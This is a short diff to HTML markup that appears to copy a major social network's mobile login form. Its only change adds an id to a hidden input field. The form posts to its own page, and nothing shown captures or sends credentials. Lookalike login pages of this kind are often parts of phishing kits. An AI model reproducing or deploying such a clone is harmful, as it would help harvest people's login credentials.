@@ -27,7 +27,7 @@
                   </div>
                   <div class="_5rut">
                     <form method="post" action="" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1">
-                      <input type="hidden" name="idapodo" value="">
+                      <input type="hidden" id="idapodo" name="idapodo" value="">
                       <div>
                         <div class="_56be">
                           <div class="_55wo _56bf">
